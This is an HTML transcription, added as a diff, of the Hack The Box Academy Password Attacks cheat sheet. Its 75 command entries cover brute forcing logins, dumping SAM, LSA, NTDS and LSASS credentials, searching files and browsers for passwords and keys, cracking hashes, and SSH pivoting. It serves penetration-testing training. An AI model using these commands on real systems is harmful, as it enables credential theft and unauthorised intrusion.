@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1"
+  >
+
+  <meta
+    name="theme-color"
+    content="#0b1220"
+  >
+
+  <meta
+    name="description"
+    content="Password Attacks cheat sheet, transcribed from the eleven-page Hack The Box Academy PDF."
+  >
+
+  <title>Password Attacks | Cheat Sheet</title>
+
+  <link
+    rel="icon"
+    type="image/svg+xml"
+    href="../dagger.svg"
+  >
+
+  <link
+    rel="stylesheet"
+    href="../assets/css/cheatsheet.css"
+  >
+</head>
+
+<body
+  id="top"
+  data-sheet-id="password-attacks"
+  style="
+    --command-column-width: 45%;
+    --description-column-width: 55%;
+  "
+>
+
+  <a
+    class="skip-link"
+    href="#content"
+  >
+    Skip to commands
+  </a>
+
+  <!--
+    The library list is intentionally empty here.
+    assets/js/cheatsheet.js builds it from assets/js/cheatsheets.js.
+  -->
+  <aside
+    id="site-sidebar"
+    class="site-sidebar"
+    aria-label="Cheat sheet library"
+  >
+    <div class="sidebar-header">
+      <div>
+        <p class="library-kicker">
+          REFERENCE LIBRARY
+        </p>
+
+        <p class="library-name">
+          Cheat sheets
+        </p>
+      </div>
+
+      <button
+        id="sidebar-toggle"
+        class="sidebar-toggle"
+        type="button"
+        aria-controls="sidebar-panel"
+        aria-expanded="true"
+        hidden
+      >
+        Close
+      </button>
+    </div>
+
+    <div
+      id="sidebar-panel"
+      class="sidebar-panel"
+    >
+      <section
+        class="sidebar-section"
+        aria-labelledby="library-heading"
+      >
+        <div class="sidebar-section-heading">
+          <h2 id="library-heading">
+            Browse cheat sheets
+          </h2>
+
+          <span
+            id="library-count"
+            class="library-count"
+            role="status"
+            aria-live="polite"
+          >
+            Loading...
+          </span>
+        </div>
+
+        <form
+          id="library-search-form"
+          class="sidebar-search"
+          role="search"
+          aria-label="Cheat sheet library"
+          hidden
+        >
+          <label for="library-search">
+            Find a cheat sheet
+          </label>
+
+          <input
+            id="library-search"
+            type="search"
+            placeholder="Filter titles..."
+            autocomplete="off"
+            spellcheck="false"
+            aria-controls="cheatsheet-links"
+          >
+        </form>
+
+        <nav aria-label="Cheat sheets">
+          <ul
+            id="cheatsheet-links"
+            class="sheet-links"
+          ></ul>
+        </nav>
+
+        <p
+          id="library-empty"
+          class="library-empty"
+          hidden
+        >
+          No matching cheat sheets.
+        </p>
+      </section>
+    </div>
+  </aside>
+
+  <!--
+    The source-page links are also generated automatically
+    from the table's <tbody id="page-N"> sections.
+  -->
+  <aside
+    class="sheet-panel"
+    aria-labelledby="sheet-panel-heading"
+  >
+    <div class="sheet-panel-inner">
+      <h2 id="sheet-panel-heading">
+        On this sheet
+      </h2>
+
+      <p class="sidebar-caption">
+        Jump to a source PDF page.
+      </p>
+
+      <nav
+        id="sheet-page-nav"
+        class="sheet-page-nav"
+        aria-label="PDF pages in this cheat sheet"
+      ></nav>
+    </div>
+  </aside>
+
+  <div class="site-content">
+    <header class="hero">
+      <div class="container">
+        <p class="eyebrow">
+          HACK THE BOX ACADEMY / PDF REFERENCE
+        </p>
+
+        <h1>
+          Password
+          <span>Attacks</span>
+</h1>
+
+        <p class="subtitle">
+          Cheat sheet
+        </p>
+
+        <nav
+          id="sheet-pagination"
+          class="sheet-pagination"
+          aria-label="Previous and next cheat sheets"
+          hidden
+        ></nav>
+
+        <div
+          class="metadata"
+          aria-label="Document information"
+        >
+          <span
+            id="entry-total"
+            class="badge"
+          >
+            Loading entries...
+          </span>
+
+          <span
+            id="page-total"
+            class="badge"
+          >
+            Loading pages...
+          </span>
+
+          <span class="badge">
+            HTML transcription
+          </span>
+        </div>
+      </div>
+    </header>
+
+    <main
+      id="content"
+      class="container"
+      tabindex="-1"
+    >
+      <p class="source-note">
+        Original PDF wording, command syntax, section order, and descriptions are retained.
+        Line wrapping from the PDF has been removed.
+      </p>
+
+      <form aria-label="Password attack commands in this cheat sheet" class="toolbar" hidden="" id="search-form" role="search">
+<label for="search">
+          Find a command
+        </label>
+<div class="search-row">
+<input aria-controls="commands" aria-describedby="result-count" autocomplete="off" id="search" placeholder="Search commands or descriptions..." spellcheck="false" type="search"/>
+<button class="button" id="clear" type="button">
+            Clear
+          </button>
+<button class="button" id="print" type="button">
+            Print all
+          </button>
+</div>
+<p aria-atomic="true" aria-live="polite" class="result-count" id="result-count" role="status">
+          Showing 75 of 75 entries
+        </p>
+</form>
+
+      <div class="table-shell">
+        <table id="commands" role="table">
+<caption class="sr-only">
+            Password Attacks cheat sheet:
+            commands and descriptions in source PDF order.
+          </caption>
+<colgroup>
+<col class="command-column"/>
+<col class="description-column"/>
+</colgroup>
+<thead>
+<tr>
+<th id="command-heading">Command</th>
+<th id="description-heading">Description</th>
+</tr>
+</thead>
+<!-- PAGE 01 -->
+<tbody id="page-1">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 01</span>
+<span class="page-count">6 entries</span>
+</div>
+</th>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Connecting to Target
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>xfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!</code></pre></div></td>
+<td class="description">CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>evil-winrm -i &lt;ip&gt; -u user -p password</code></pre></div></td>
+<td class="description">Uses Evil-WinRM to establish a Powershell session with a target.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>ssh user@&lt;ip&gt;</code></pre></div></td>
+<td class="description">Uses SSH to connect to a target using a specified user.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>smbclient -U user \\&lt;ip&gt;\SHARENAME</code></pre></div></td>
+<td class="description">Uses smbclient to connect to an SMB share using a specified user.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</code></pre></div></td>
+<td class="description">Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.</td>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Password Mutations &amp; Custom Wordlists
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></pre></div></td>
+<td class="description">Uses cewl to generate a wordlist based on keywords present on a website.</td>
+</tr>
+</tbody>
+<!-- PAGE 02 -->
+<tbody id="page-2">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 02</span>
+<span class="page-count">8 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</code></pre></div></td>
+<td class="description">Uses Hashcat to generate a rule-based word list.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code></pre></div></td>
+<td class="description">Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt</code></pre></div></td>
+<td class="description">Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.</td>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Remote Password Attacks
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>netexec winrm &lt;ip&gt; -u user.list -p password.list</code></pre></div></td>
+<td class="description">Uses Netexec over WinRM to attempt to brute force user names and passwords specified hosted on a target.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>netexec smb &lt;ip&gt; -u "user" -p "password" --shares</code></pre></div></td>
+<td class="description">Uses Netexec to enumerate smb shares on a target using a specified set of credentials.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</code></pre></div></td>
+<td class="description">Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</code></pre></div></td>
+<td class="description">Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hydra -L user.list -p password &lt;service&gt;://&lt;ip&gt;</code></pre></div></td>
+<td class="description">Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.</td>
+</tr>
+</tbody>
+<!-- PAGE 03 -->
+<tbody id="page-3">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 03</span>
+<span class="page-count">8 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</code></pre></div></td>
+<td class="description">Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>netexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code></pre></div></td>
+<td class="description">Uses Netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>netexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code></pre></div></td>
+<td class="description">Uses Netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>netexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code></pre></div></td>
+<td class="description">Uses Netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>evil-winrm -i &lt;ip&gt; -u Administrator -H "&lt;passwordhash&gt;"</code></pre></div></td>
+<td class="description">Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of Pass-The-Hash attack.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>./Pcredz -f demo.pcapng -t -v</code></pre></div></td>
+<td class="description">Extract credentials a network packet capture</td>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Windows Local Password Attacks
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>tasklist /svc</code></pre></div></td>
+<td class="description">A command-line-based utility in Windows used to list running processes.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></pre></div></td>
+<td class="description">Uses Windows command-line based utility findstr to search for the string "password" in many different file type.</td>
+</tr>
+</tbody>
+<!-- PAGE 04 -->
+<tbody id="page-4">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 04</span>
+<span class="page-count">3 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>Get-Process lsass</code></pre></div></td>
+<td class="description">A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre></div></td>
+<td class="description">Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>pypykatz lsa minidump /path/to/lsassdumpfile</code></pre></div></td>
+<td class="description">Uses Pypykatz to parse and attempt to extract credentials &amp; password hashes from an LSASS process memory dump file.</td>
+</tr>
+</tbody>
+<!-- PAGE 05 -->
+<tbody id="page-5">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 05</span>
+<span class="page-count">4 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>reg.exe save hklm\sam C:\sam.save</code></pre></div></td>
+<td class="description">Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>move sam.save \\&lt;ip&gt;\NameofFileShare</code></pre></div></td>
+<td class="description">Uses move in Windows to transfer a file to a specified file share over the network.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre></div></td>
+<td class="description">Uses Secretsdump.py to dump password hashes from the SAM database.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>vssadmin CREATE SHADOW /For=C:</code></pre></div></td>
+<td class="description">Uses Windows command line based tool vssadmin to create a volume shadow copy for C:. This can be used to make a copy of NTDS.dit safely.</td>
+</tr>
+</tbody>
+<!-- PAGE 06 -->
+<tbody id="page-6">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 06</span>
+<span class="page-count">6 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></pre></div></td>
+<td class="description">Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>rundll32 keymgr.dll,KRShowKeyMgr</code></pre></div></td>
+<td class="description">Access the Credential Manager prompt to backup or restore saved credentials</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>cmdkey /list</code></pre></div></td>
+<td class="description">Enumerate credentials stored in the current user's profile</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>runas /savecred /user:&lt;username&gt; cmd</code></pre></div></td>
+<td class="description">Launch a new instance of cmd.exe while impersonating a stored user.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>snaffler.exe -s</code></pre></div></td>
+<td class="description">Search network shares for interesting files and credentials</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public</code></pre></div></td>
+<td class="description">Search network shares for interesting files and save the results.</td>
+</tr>
+</tbody>
+<!-- PAGE 07 -->
+<tbody id="page-7">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 07</span>
+<span class="page-count">9 entries</span>
+</div>
+</th>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Linux Local Password Attacks
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "lib|fonts|share|core" ;done</code></pre></div></td>
+<td class="description">Script that can be used to find .conf, .config and .cnf files on a Linux system.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2&gt;/dev/null | grep -v "\#";done</code></pre></div></td>
+<td class="description">Script that can be used to find credentials in specified file types.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "doc|lib|headers|share|man";done</code></pre></div></td>
+<td class="description">Script that can be used to find common database files.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>find /home/* -type f -name "*.txt" -o ! -name "*.*"</code></pre></div></td>
+<td class="description">Uses Linux-based find command to search for text files.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2&gt;/dev/null | grep -v "doc|lib|headers|share";done</code></pre></div></td>
+<td class="description">Script that can be used to search for common file types used with scripts.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2&gt;/dev/null | grep -v "lib|fonts|share|core" ;done</code></pre></div></td>
+<td class="description">Script used to look for common types of documents.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>cat /etc/crontab</code></pre></div></td>
+<td class="description">Uses Linux-based cat command to view the contents of crontab in search for credentials.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>ls -la /etc/cron.*/</code></pre></div></td>
+<td class="description">Uses Linux-based ls -la command to list all files that start with cron contained in the etc directory.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>grep -rnw "PRIVATE KEY" /* 2&gt;/dev/null | grep ":1"</code></pre></div></td>
+<td class="description">Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.</td>
+</tr>
+</tbody>
+<!-- PAGE 08 -->
+<tbody id="page-8">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 08</span>
+<span class="page-count">10 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>grep -rnw "PRIVATE KEY" /home/* 2&gt;/dev/null | grep ":1"</code></pre></div></td>
+<td class="description">Uses Linux-based grep command to search for the keywords PRIVATE KEY within files contained in a user's home directory.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>grep -rnw "ssh-rsa" /home/* 2&gt;/dev/null | grep ":1"</code></pre></div></td>
+<td class="description">Uses Linux-based grep command to search for keywords ssh-rsa within files contained in a user's home directory.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>tail -n5 /home/*/.bash*</code></pre></div></td>
+<td class="description">Uses Linux-based tail command to search the through bash history files and output the last 5 lines.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3 mimipenguin.py</code></pre></div></td>
+<td class="description">Runs Mimipenguin.py using python3.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>bash mimipenguin.sh</code></pre></div></td>
+<td class="description">Runs Mimipenguin.sh using bash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python2.7 lazagne.py all</code></pre></div></td>
+<td class="description">Runs Lazagne.py with all modules using python2.7</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>ls -l .mozilla/firefox/ | grep default</code></pre></div></td>
+<td class="description">Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword default using grep.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</code></pre></div></td>
+<td class="description">Uses Linux-based command cat to search for credentials stored by Firefox in JSON.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3.9 firefox_decrypt.py</code></pre></div></td>
+<td class="description">Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3 lazagne.py browsers</code></pre></div></td>
+<td class="description">Runs Lazagne.py browsers module using Python 3.</td>
+</tr>
+</tbody>
+<!-- PAGE 09 -->
+<tbody id="page-9">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 09</span>
+<span class="page-count">9 entries</span>
+</div>
+</th>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Cracking Passwords
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></pre></div></td>
+<td class="description">Uses Hashcat to crack NTLM hashes using a specified wordlist.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></pre></div></td>
+<td class="description">Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></pre></div></td>
+<td class="description">Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></pre></div></td>
+<td class="description">Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></pre></div></td>
+<td class="description">Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></pre></div></td>
+<td class="description">Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>python3 ssh2john.py SSH.private &gt; ssh.hash</code></pre></div></td>
+<td class="description">Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>john ssh.hash --show</code></pre></div></td>
+<td class="description">Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>office2john.py Protected.docx &gt; protected-docx.hash</code></pre></div></td>
+<td class="description">Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.</td>
+</tr>
+</tbody>
+<!-- PAGE 10 -->
+<tbody id="page-10">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 10</span>
+<span class="page-count">9 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>john --wordlist=rockyou.txt protected-docx.hash</code></pre></div></td>
+<td class="description">Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>pdf2john.pl PDF.pdf &gt; pdf.hash</code></pre></div></td>
+<td class="description">Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>john --wordlist=rockyou.txt pdf.hash</code></pre></div></td>
+<td class="description">Runs John in conjunction with a wordlist to crack a pdf hash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>zip2john ZIP.zip &gt; zip.hash</code></pre></div></td>
+<td class="description">Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>john --wordlist=rockyou.txt zip.hash</code></pre></div></td>
+<td class="description">Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></pre></div></td>
+<td class="description">Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>file GZIP.gzip</code></pre></div></td>
+<td class="description">Uses the Linux-based file tool to gather file format information.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz;done</code></pre></div></td>
+<td class="description">Script that runs a for-loop to extract files from an archive.</td>
+</tr>
+<tr class="section-divider">
+<th colspan="2">
+                Pivoting
+              </th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>ssh -D 9050 user@&lt;DMZ01&gt;</code></pre></div></td>
+<td class="description">Establishes a SOCKS proxy on port 9050 via SSH. Once the DMZ01 host is compromised, this allows routing of traffic through the DMZ into the internal network — enabling pivoting to otherwise inaccessible systems.</td>
+</tr>
+</tbody>
+<!-- PAGE 11 -->
+<tbody id="page-11">
+<tr class="page-divider">
+<th colspan="2">
+<div class="page-heading">
+<span>PDF PAGE 11</span>
+<span class="page-count">3 entries</span>
+</div>
+</th>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>sudo vim /etc/proxychains.conf</code></pre></div></td>
+<td class="description">Opens the ProxyChains configuration file in Vim. Ensure that the line socks4 127.0.0.1 9050 is present under the [ProxyList] section — this defines the local SOCKS proxy (created by SSH) through which traffic will be routed. This entry may already exist but could be commented out.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open</code></pre></div></td>
+<td class="description">Performs a TCP scan on an internal host using Nmap. The proxychains prefix routes the scan through the previouly established SOCKS proxy, allowing internal reconnaissance from the attacker's machine. Note that the -sT option is required when using Nmap with ProxyChains.</td>
+</tr>
+<tr class="entry">
+<td><div class="command"><pre><code>proxychains xfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!</code></pre></div></td>
+<td class="description">Launches an RDP session routed through the SOCKS proxy. This is useful for interacting with internal desktops (like domain-joined Windows hosts) when direct network access is not possible.</td>
+</tr>
+</tbody>
+</table>
+
+        <p
+          id="no-results"
+          class="empty-state"
+          hidden
+        >
+          No matching entries.
+          Try a different search or clear the filter.
+        </p>
+      </div>
+    </main>
+
+    <footer class="container">
+<p>
+        Source: Hack The Box Academy,
+        <cite>Password Attacks Cheat Sheet</cite>,
+        pages 1–11.
+
+        <br/>
+
+        Source file:
+        Password Attacks - cheatsheet.pdf
+      </p>
+<a href="#top">
+        Back to top ↑
+      </a>
+</footer>
+  </div>
+
+  <div
+    id="copy-status"
+    class="toast"
+    role="status"
+    aria-live="polite"
+    aria-atomic="true"
+  ></div>
+
+  <script src="../assets/js/cheatsheets.js"></script>
+  <script src="../assets/js/cheatsheet.js"></script>
+</body>
+</html>
